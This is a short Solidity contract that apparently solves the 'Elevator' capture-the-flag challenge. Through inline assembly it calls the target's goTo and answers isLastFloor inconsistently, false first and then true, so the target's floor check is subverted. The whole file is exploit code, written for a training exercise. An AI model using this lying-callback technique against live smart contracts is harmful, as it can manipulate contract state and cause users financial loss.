// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

interface Elevator {
    function goTo(uint) external;
}

contract ElevatorHack {
    Elevator elevator;
    uint index;

    constructor(address chal) {
        elevator = Elevator(chal);
    }

    function hack() public {
        // elevator.goTo(1);
        assembly {
            mstore(0, "goTo(uint256)")
            mstore(0, keccak256(0, 13))
            mstore(4, 1)
            let success := call(gas(), sload(0), 0, 0, 0x24, 0, 0)
            if iszero(success) {
                revert(0, 0)
            }
        }
    }

    function isLastFloor(uint256) external returns (bool) {
        // ++index;
        // return index > 1;

        assembly {
            let _index := sload(1)
            _index := add(_index, 1)
            sstore(1, _index)
            mstore(0x20, gt(_index, 1))
            return(0x20, 0x40)
        }
    }
}
